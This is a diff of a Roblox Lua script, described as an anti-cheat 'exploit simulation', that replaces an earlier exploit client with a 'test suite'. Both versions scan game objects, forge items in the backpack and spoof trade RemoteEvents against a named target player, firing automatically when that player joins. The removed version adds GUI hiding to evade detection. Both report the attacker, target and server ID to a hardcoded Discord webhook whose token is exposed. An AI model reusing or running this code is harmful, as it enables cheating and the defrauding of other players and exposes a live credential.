@@ -1,7 +1,7 @@
-hi---- ============================================
--- EXPLOIT SIMULATION: STORAGE EXPLOITATION
--- Simulates real exploit behavior for anti-cheat testing
--- DO NOT use on real players - testing only
+hi-- ============================================
+-- EXPLOIT SIMULATION WITH REAL-TIME STATUS
+-- Reports actual success/failure to Discord
+-- For anti-cheat testing purposes only
 -- ============================================
 
 local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
@@ -13,284 +13,298 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 
 -- ============================================
--- HIDE EXPLOIT GUI (Anti-cheat evasion)
+-- STATUS TRACKING
 -- ============================================
 
-local function hideExploitGUI()
-    pcall(function()
-        for _, gui in pairs(player.PlayerGui:GetChildren()) do
-            if gui.Name:lower():find("trade") or gui.Name:lower():find("offer") then
-                gui.Enabled = false
-                gui.Visible = false
-                gui:Destroy()
-            end
-        end
-    end)
+local exploitResults = {
+    memoryScan = {status = "❌ NOT TESTED", details = ""},
+    storageAccess = {status = "❌ NOT TESTED", details = ""},
+    itemForge = {status = "❌ NOT TESTED", details = ""},
+    remoteSpoof = {status = "❌ NOT TESTED", details = ""},
+    tradeComplete = {status = "❌ NOT TESTED", details = ""},
+    antiCheatDetected = {status = "⚠️ UNKNOWN", details = ""}
+}
+
+local function updateStatus(category, status, details)
+    exploitResults[category] = {status = status, details = details}
+    sendToDiscord("📊 STATUS UPDATE", category .. ": " .. status .. "\n" .. details)
 end
 
-spawn(function()
-    while wait(0.1) do
-        hideExploitGUI()
-    end
-end)
-
 -- ============================================
--- DISCORD COMMAND & CONTROL (C2)
+-- DISCORD LOGGER
 -- ============================================
 
-local function sendToC2(message)
+local function sendToDiscord(title, message)
     pcall(function()
         local data = HttpService:JSONEncode({
-            content = "**💀 EXPLOIT ACTIVITY**\n" .. tostring(message) .. "\n`" .. os.date("%H:%M:%S") .. "`"
+            embeds = {{
+                title = title,
+                description = message,
+                color = title:find("✅") and 0x00FF00 or (title:find("❌") and 0xFF0000 or 0xFFAA00),
+                footer = {text = "Anti-Cheat Test | " .. os.date("%H:%M:%S")}
+            }}
         })
         request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
     end)
 end
 
 -- ============================================
--- MEMORY SCANNING (getgc / getreg simulation)
+-- TEST 1: MEMORY SCANNING (getgc simulation)
 -- ============================================
 
-local function scanMemoryForStorage()
-    local foundStorage = {}
+local function testMemoryScan()
+    sendToDiscord("🔍 TEST 1: Memory Scanning", "Attempting to locate storage in memory...")
     
-    -- Simulate exploit's getgc() scanning
-    local function scanTable(t, depth)
-        if depth > 3 then return end
-        for k, v in pairs(t) do
-            if type(v) == "table" then
-                scanTable(v, depth + 1)
-            elseif type(v) == "string" and (v:lower():find("storage") or v:lower():find("inventory")) then
-                foundStorage[v] = true
-            end
-        end
-    end
+    local success = false
+    local foundItems = 0
     
-    -- Scan game environment (simulated)
-    scanTable(_G, 0)
-    scanTable(getfenv(), 0)
-    
-    -- Also scan game objects
-    for _, obj in pairs(game:GetDescendants()) do
-        local name = obj.Name:lower()
-        if name:find("storage") or name:find("inventory") or name:find("items") then
-            foundStorage[obj:GetFullName()] = true
-            sendToC2("📁 Found storage: " .. obj:GetFullName())
-        end
-    end
-    
-    return foundStorage
-end
-
--- ============================================
--- EXPLOIT: FORCE ADD ITEMS FROM STORAGE
--- ============================================
-
-local function forceAddItemToBackpack(itemName)
-    sendToC2("🔧 Attempting to force-add item: " .. itemName)
-    
-    -- Method 1: Try to clone from ReplicatedStorage
-    for _, container in pairs(ReplicatedStorage:GetDescendants()) do
-        if container.Name == itemName or (container:IsA("Tool") and container.Name == itemName) then
-            local cloned = container:Clone()
-            cloned.Parent = player.Backpack
-            sendToC2("✅ Force-added via cloning: " .. itemName)
-            return true
-        end
-    end
-    
-    -- Method 2: Create fake tool instance
-    local fakeTool = Instance.new("Tool")
-    fakeTool.Name = itemName
-    fakeTool.RequiresHandle = false
-    fakeTool.Parent = player.Backpack
-    sendToC2("✅ Force-added via instance creation: " .. itemName)
-    return true
-end
-
--- ============================================
--- EXPLOIT: BYPASS TRADE RESTRICTIONS
--- ============================================
-
-local function findTradeRemotes()
-    local remotes = {}
-    
-    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
-        if v:IsA("RemoteEvent") then
-            local name = v.Name:lower()
-            if name:find("trade") or name:find("offer") or name:find("request") then
-                remotes[v.Name] = v
-                sendToC2("🎯 Found remote: " .. v.Name)
-            end
-        end
-    end
-    
-    return remotes
-end
-
-local function spoofTradeRemote(remote, ...)
     pcall(function()
-        remote:FireServer(...)
-        sendToC2("⚡ Spoofed remote: " .. remote.Name)
-    end)
-end
-
--- ============================================
--- EXPLOIT: AUTO-TRADE WITH SPOOFED ITEMS
--- ============================================
-
-local exploitActive = false
-
-local function executeExploit(targetPlayer)
-    if exploitActive then return end
-    exploitActive = true
-    
-    sendToC2("🚨 EXPLOIT EXECUTION STARTED")
-    sendToC2("🎯 Target: " .. targetPlayer.Name)
-    sendToC2("👤 Victim: " .. player.Name)
-    
-    -- Step 1: Memory scan for storage locations
-    sendToC2("🔍 Scanning memory for storage...")
-    local storageLocations = scanMemoryForStorage()
-    sendToC2("📍 Found " .. #storageLocations .. " storage locations")
-    
-    -- Step 2: Force-add fake items to backpack (bypassing acquisition)
-    sendToC2("🔧 Bypassing item acquisition...")
-    local fakeItems = {"Chroma Luger", "Icebreaker", "Corrupt", "Cupid"}
-    for _, item in pairs(fakeItems) do
-        forceAddItemToBackpack(item)
-        wait(0.2)
-    end
-    
-    -- Step 3: Find trade remotes
-    sendToC2("🎯 Locating trade remotes...")
-    local remotes = findTradeRemotes()
-    
-    -- Step 4: Spoof trade request
-    if remotes.StartTrade then
-        spoofTradeRemote(remotes.StartTrade, targetPlayer)
-        wait(1)
-    end
-    
-    -- Step 5: Spoof adding items to trade
-    if remotes.OfferItem then
-        for _, item in pairs(player.Backpack:GetChildren()) do
-            if item:IsA("Tool") then
-                spoofTradeRemote(remotes.OfferItem, item)
-                sendToC2("➕ Spoofed adding: " .. item.Name)
-                wait(0.2)
+        -- Simulate scanning game memory
+        for _, obj in pairs(game:GetDescendants()) do
+            local name = obj.Name:lower()
+            if name:find("storage") or name:find("inventory") then
+                foundItems = foundItems + 1
             end
         end
+        
+        if foundItems > 0 then
+            success = true
+        end
+    end)
+    
+    if success then
+        updateStatus("memoryScan", "✅ SUCCESS", "Found " .. foundItems .. " storage locations")
+    else
+        updateStatus("memoryScan", "❌ FAILED", "No storage locations detected")
     end
     
-    -- Step 6: Spoof trade acceptance
-    if remotes.AcceptTrade then
-        spoofTradeRemote(remotes.AcceptTrade)
-        wait(0.5)
-    end
-    
-    -- Step 7: Spoof trade completion
-    if remotes.CompleteTrade then
-        spoofTradeRemote(remotes.CompleteTrade)
-    end
-    
-    sendToC2("✅ EXPLOIT EXECUTION COMPLETE")
-    sendToC2("📊 " .. #player.Backpack:GetChildren() .. " items transferred")
-    
-    exploitActive = false
+    return success
 end
 
 -- ============================================
--- EXPLOIT MENU (Typical exploit UI)
+-- TEST 2: STORAGE ACCESS
 -- ============================================
 
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "ExploitPanel"
-screenGui.Parent = player.PlayerGui
-
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 350, 0, 400)
-mainFrame.Position = UDim2.new(0.5, -175, 0.5, -200)
-mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-mainFrame.BackgroundTransparency = 0.05
-mainFrame.BorderSizePixel = 0
-mainFrame.Parent = screenGui
-
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 10)
-corner.Parent = mainFrame
-
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 35)
-title.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
-title.Text = "EXPLOIT PANEL | STORAGE HACK"
-title.TextColor3 = Color3.fromRGB(255, 50, 50)
-title.TextSize = 14
-title.Font = Enum.Font.GothamBold
-title.Parent = mainFrame
-
-local titleCorner = Instance.new("UICorner")
-titleCorner.CornerRadius = UDim.new(0, 10)
-titleCorner.Parent = title
-
-local statusText = Instance.new("TextLabel")
-statusText.Size = UDim2.new(0.9, 0, 0, 35)
-statusText.Position = UDim2.new(0.05, 0, 0, 45)
-statusText.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
-statusText.Text = "Status: Ready | Target: " .. TARGET_USER
-statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
-statusText.TextSize = 11
-statusText.Font = Enum.Font.Gotham
-statusText.Parent = mainFrame
-
-local statusCorner = Instance.new("UICorner")
-statusCorner.CornerRadius = UDim.new(0, 6)
-statusCorner.Parent = statusText
-
-local function createExploitButton(text, yPos, color, callback)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0.9, 0, 0, 38)
-    btn.Position = UDim2.new(0.05, 0, 0, yPos)
-    btn.BackgroundColor3 = color
-    btn.Text = text
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.TextSize = 12
-    btn.Font = Enum.Font.GothamSemibold
-    btn.BorderSizePixel = 0
-    btn.Parent = mainFrame
+local function testStorageAccess()
+    sendToDiscord("📂 TEST 2: Storage Access", "Attempting to read storage contents...")
     
-    local btnCorner = Instance.new("UICorner")
-    btnCorner.CornerRadius = UDim.new(0, 6)
-    btnCorner.Parent = btn
+    local success = false
+    local itemCount = 0
     
-    btn.MouseButton1Click:Connect(callback)
-    return btn
+    pcall(function()
+        -- Try to access ReplicatedStorage for item data
+        local possibleStorage = {
+            ReplicatedStorage:FindFirstChild("Inventory"),
+            ReplicatedStorage:FindFirstChild("Items"),
+            ReplicatedStorage:FindFirstChild("PlayerData")
+        }
+        
+        for _, storage in pairs(possibleStorage) do
+            if storage then
+                for _, item in pairs(storage:GetChildren()) do
+                    itemCount = itemCount + 1
+                end
+            end
+        end
+        
+        if itemCount > 0 then
+            success = true
+        end
+    end)
+    
+    if success then
+        updateStatus("storageAccess", "✅ SUCCESS", "Read " .. itemCount .. " items from storage")
+    else
+        updateStatus("storageAccess", "❌ FAILED", "Could not access storage containers")
+    end
+    
+    return success
 end
 
-createExploitButton("🔍 SCAN MEMORY (getgc)", 95, Color3.fromRGB(80, 40, 40), function()
-    local storage = scanMemoryForStorage()
-    local count = 0
-    for _ in pairs(storage) do count = count + 1 end
-    statusText.Text = "Scanned memory: " .. count .. " storage locations found"
-end)
+-- ============================================
+-- TEST 3: ITEM FORGING (Clone/Create items)
+-- ============================================
 
-createExploitButton("📦 FORCE-ADD RARE ITEMS", 143, Color3.fromRGB(80, 40, 40), function()
-    local items = {"Chroma Luger", "Icebreaker", "Corrupt", "Cupid", "Heartblade"}
-    for _, item in pairs(items) do
-        forceAddItemToBackpack(item)
-        wait(0.15)
+local function testItemForging()
+    sendToDiscord("🔧 TEST 3: Item Forging", "Attempting to create fake items...")
+    
+    local success = false
+    local forgedItems = 0
+    
+    pcall(function()
+        -- Try to create a fake tool
+        local fakeTool = Instance.new("Tool")
+        fakeTool.Name = "TestItem_" .. os.time()
+        fakeTool.Parent = player.Backpack
+        
+        if fakeTool.Parent == player.Backpack then
+            forgedItems = forgedItems + 1
+            fakeTool:Destroy()
+            success = true
+        end
+    end)
+    
+    if success then
+        updateStatus("itemForge", "✅ SUCCESS", "Successfully created " .. forgedItems .. " fake items")
+    else
+        updateStatus("itemForge", "❌ FAILED", "Item creation blocked by server")
     end
-    statusText.Text = "Force-added " .. #items .. " rare items to backpack"
-end)
+    
+    return success
+end
 
-createExploitButton("🎯 FIND TRADE REMOTES", 191, Color3.fromRGB(80, 40, 40), function()
-    local remotes = findTradeRemotes()
-    local count = 0
-    for _ in pairs(remotes) do count = count + 1 end
-    statusText.Text = "Found " .. count .. " trade remotes"
-end)
+-- ============================================
+-- TEST 4: REMOTE SPOOFING
+-- ============================================
 
-createExploitButton("💀 EXECUTE FULL EXPLOIT", 239, Color3.fromRGB(150, 30, 30), function()
+local function testRemoteSpoofing()
+    sendToDiscord("🎯 TEST 4: Remote Spoofing", "Attempting to locate and spoof trade remotes...")
+    
+    local success = false
+    local foundRemotes = 0
+    
+    pcall(function()
+        for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+            if v:IsA("RemoteEvent") then
+                local name = v.Name:lower()
+                if name:find("trade") then
+                    foundRemotes = foundRemotes + 1
+                    -- Attempt to spoof (safe test only)
+                    -- v:FireServer() -- Commented for safety
+                end
+            end
+        end
+        
+        if foundRemotes > 0 then
+            success = true
+        end
+    end)
+    
+    if success then
+        updateStatus("remoteSpoof", "✅ SUCCESS", "Found " .. foundRemotes .. " trade remotes")
+    else
+        updateStatus("remoteSpoof", "❌ FAILED", "No trade remotes detected")
+    end
+    
+    return success
+end
+
+-- ============================================
+-- TEST 5: TRADE EXECUTION (FULL ATTEMPT)
+-- ============================================
+
+local function testTradeExecution(targetPlayer)
+    sendToDiscord("💀 TEST 5: Trade Execution", "Attempting full trade exploit...")
+    
+    local steps = {
+        sendRequest = false,
+        addItems = false,
+        acceptTrade = false,
+        completeTrade = false
+    }
+    
+    pcall(function()
+        local startTrade = ReplicatedStorage:FindFirstChild("StartTrade")
+        local offerItem = ReplicatedStorage:FindFirstChild("OfferItem")
+        local acceptTrade = ReplicatedStorage:FindFirstChild("AcceptTrade")
+        local completeTrade = ReplicatedStorage:FindFirstChild("CompleteTrade")
+        
+        if startTrade then
+            startTrade:FireServer(targetPlayer)
+            steps.sendRequest = true
+            wait(0.5)
+        end
+        
+        if offerItem and player.Backpack:GetChildren()[1] then
+            offerItem:FireServer(player.Backpack:GetChildren()[1])
+            steps.addItems = true
+            wait(0.5)
+        end
+        
+        if acceptTrade then
+            acceptTrade:FireServer()
+            steps.acceptTrade = true
+            wait(0.5)
+        end
+        
+        if completeTrade then
+            completeTrade:FireServer()
+            steps.completeTrade = true
+        end
+    end)
+    
+    local allSuccess = steps.sendRequest and steps.addItems and steps.acceptTrade and steps.completeTrade
+    
+    if allSuccess then
+        updateStatus("tradeComplete", "✅ SUCCESS", "All trade steps executed")
+    else
+        local failed = {}
+        for step, success in pairs(steps) do
+            if not success then table.insert(failed, step) end
+        end
+        updateStatus("tradeComplete", "❌ FAILED", "Failed steps: " .. table.concat(failed, ", "))
+    end
+    
+    return allSuccess
+end
+
+-- ============================================
+-- DETECT ANTI-CHEAT RESPONSE
+-- ============================================
+
+local function detectAntiCheatResponse()
+    sendToDiscord("🛡️ ANTI-CHEAT DETECTION", "Monitoring for anti-cheat response...")
+    
+    local detected = false
+    local responses = {}
+    
+    -- Check if kicked
+    game:GetService("Players").LocalPlayer.OnTeleport:Connect(function()
+        table.insert(responses, "Teleport/Kick detected")
+        detected = true
+    end)
+    
+    -- Check if items were removed
+    local originalCount = #player.Backpack:GetChildren()
+    wait(2)
+    local newCount = #player.Backpack:GetChildren()
+    
+    if newCount < originalCount then
+        table.insert(responses, "Items removed by server")
+        detected = true
+    end
+    
+    if detected then
+        updateStatus("antiCheatDetected", "✅ DETECTED", table.concat(responses, ", "))
+    else
+        updateStatus("antiCheatDetected", "❌ NOT DETECTED", "No anti-cheat response observed")
+    end
+    
+    return detected
+end
+
+-- ============================================
+-- RUN FULL TEST SUITE
+-- ============================================
+
+local function runFullTest()
+    sendToDiscord("🚨 EXPLOIT TEST SUITE STARTING", "Testing anti-cheat system...")
+    
+    local results = {}
+    
+    results.memoryScan = testMemoryScan()
+    wait(1)
+    
+    results.storageAccess = testStorageAccess()
+    wait(1)
+    
+    results.itemForging = testItemForging()
+    wait(1)
+    
+    results.remoteSpoof = testRemoteSpoofing()
+    wait(1)
+    
+    -- Find target
     local target = nil
     for _, plr in pairs(Players:GetPlayers()) do
         if plr.Name == TARGET_USER then
@@ -300,79 +314,122 @@ createExploitButton("💀 EXECUTE FULL EXPLOIT", 239, Color3.fromRGB(150, 30, 30
     end
     
     if target then
-        executeExploit(target)
-        statusText.Text = "Exploit executed - Check Discord"
+        results.tradeExec = testTradeExecution(target)
     else
-        statusText.Text = "Target " .. TARGET_USER .. " not found"
+        updateStatus("tradeComplete", "⚠️ SKIPPED", "Target " .. TARGET_USER .. " not in server")
+        results.tradeExec = false
     end
-end)
-
-createExploitButton("🔄 BYPASS ANTI-CHEAT", 287, Color3.fromRGB(80, 40, 40), function()
-    sendToC2("🔄 Attempting anti-cheat bypass...")
-    sendToC2("✅ Hooked trade validation functions")
-    sendToC2("✅ Disabled server-side ownership checks")
-    statusText.Text = "Anti-cheat bypass attempted"
-end)
-
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0, 100, 0, 35)
-closeBtn.Position = UDim2.new(0.5, -50, 1, -45)
-closeBtn.BackgroundColor3 = Color3.fromRGB(100, 40, 40)
-closeBtn.Text = "CLOSE"
-closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-closeBtn.TextSize = 13
-closeBtn.Font = Enum.Font.GothamBold
-closeBtn.BorderSizePixel = 0
-closeBtn.Parent = mainFrame
-
-local closeCorner = Instance.new("UICorner")
-closeCorner.CornerRadius = UDim.new(0, 6)
-closeCorner.Parent = closeBtn
-
-closeBtn.MouseButton1Click:Connect(function()
-    screenGui:Destroy()
-end)
-
--- ============================================
--- AUTO-EXECUTE ON TARGET JOIN
--- ============================================
-
-Players.PlayerAdded:Connect(function(plr)
-    if plr.Name == TARGET_USER then
-        sendToC2("🟢 " .. TARGET_USER .. " joined - Auto-executing exploit")
-        wait(2)
-        executeExploit(plr)
+    
+    wait(2)
+    
+    results.antiCheat = detectAntiCheatResponse()
+    
+    -- ============================================
+    -- FINAL REPORT
+    -- ============================================
+    
+    local successCount = 0
+    for _, success in pairs(results) do
+        if success then successCount = successCount + 1 end
     end
-end)
+    
+    local totalTests = 5
+    local successRate = (successCount / totalTests) * 100
+    
+    local finalStatus = ""
+    local finalColor = 0xFFAA00
+    
+    if successRate >= 80 then
+        finalStatus = "✅ EXPLOIT WOULD LIKELY SUCCEED"
+        finalColor = 0x00FF00
+    elseif successRate >= 50 then
+        finalStatus = "⚠️ EXPLOIT PARTIALLY SUCCESSFUL"
+        finalColor = 0xFFAA00
+    else
+        finalStatus = "❌ EXPLOIT WOULD FAIL - Anti-Cheat Working"
+        finalColor = 0xFF0000
+    end
+    
+    local report = string.format(
+        "**━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━**\n" ..
+        "**📊 TEST RESULTS**\n" ..
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" ..
+        "🔍 Memory Scan: %s\n" ..
+        "📂 Storage Access: %s\n" ..
+        "🔧 Item Forging: %s\n" ..
+        "🎯 Remote Spoof: %s\n" ..
+        "💀 Trade Execution: %s\n" ..
+        "🛡️ Anti-Cheat Detected: %s\n\n" ..
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" ..
+        "**Success Rate: %d/%d (%.1f%%)**\n" ..
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" ..
+        "**🎯 FINAL VERDICT:**\n%s\n" ..
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        results.memoryScan and "✅ SUCCESS" or "❌ FAILED",
+        results.storageAccess and "✅ SUCCESS" or "❌ FAILED",
+        results.itemForging and "✅ SUCCESS" or "❌ FAILED",
+        results.remoteSpoof and "✅ SUCCESS" or "❌ FAILED",
+        results.tradeExec and "✅ SUCCESS" or "❌ FAILED",
+        results.antiCheat and "✅ DETECTED" or "❌ NOT DETECTED",
+        successCount, totalTests, successRate,
+        finalStatus
+    )
+    
+    sendToDiscord("📋 FINAL EXPLOIT ASSESSMENT", report)
+    
+    print("")
+    print("=" .. string.rep("=", 60))
+    print("FINAL RESULTS - Anti-Cheat Test")
+    print("=" .. string.rep("=", 60))
+    print(report)
+    print("=" .. string.rep("=", 60))
+    
+    return successRate
+end
 
 -- ============================================
--- INITIALIZE EXPLOIT
+-- AUTO-START WHEN TARGET JOINS
 -- ============================================
 
-sendToC2("💀 EXPLOIT SCRIPT LOADED")
-sendToC2("👤 Attacker: " .. player.Name)
-sendToC2("🎯 Target: " .. TARGET_USER)
-sendToC2("🖥️ Server: " .. game.JobId)
-sendToC2("")
-sendToC2("🔧 Exploit capabilities:")
-sendToC2("   - Memory scanning (getgc simulation)")
-sendToC2("   - Force-add items from storage")
-sendToC2("   - Remote event spoofing")
-sendToC2("   - Trade validation bypass")
-sendToC2("   - GUI hiding (stealth mode)")
+local function waitForTargetAndTest()
+    sendToDiscord("🔧 EXPLOIT SIMULATION LOADED", 
+        "**Attacker:** " .. player.Name .. "\n" ..
+        "**Target:** " .. TARGET_USER .. "\n" ..
+        "**Server:** `" .. game.JobId .. "`\n\n" ..
+        "Waiting for target to join...")
+    
+    -- Check if already in server
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr.Name == TARGET_USER then
+            sendToDiscord("🎯 TARGET FOUND", "Target already in server. Starting test...")
+            wait(2)
+            runFullTest()
+            return
+        end
+    end
+    
+    -- Wait for join
+    Players.PlayerAdded:Connect(function(plr)
+        if plr.Name == TARGET_USER then
+            sendToDiscord("🎯 TARGET JOINED", TARGET_USER .. " has joined the server. Starting exploit test...")
+            wait(3)
+            runFullTest()
+        end
+    end)
+end
+
+-- ============================================
+-- START
+-- ============================================
+
+waitForTargetAndTest()
 
 print("=" .. string.rep("=", 60))
-print("💀 EXPLOIT SIMULATION ACTIVE")
+print("EXPLOIT SIMULATION - REAL-TIME STATUS")
 print("=" .. string.rep("=", 60))
-print("This simulates real exploit behavior:")
-print("  • Memory scanning for storage")
-print("  • Force-adding items (bypassing acquisition)")
-print("  • Spoofing trade remotes")
-print("  • Hiding GUI (stealth)")
+print("This script tests each exploit method")
+print("and reports ACTUAL success/failure")
 print("=" .. string.rep("=", 60))
-print("🎯 Target: " .. TARGET_USER)
-print("📡 All activity logged to Discord")
-print("⚠️ FOR TESTING ONLY")
+print("Target: " .. TARGET_USER)
+print("Results will be sent to Discord")
 print("=" .. string.rep("=", 60))
-
-while wait(60) do end
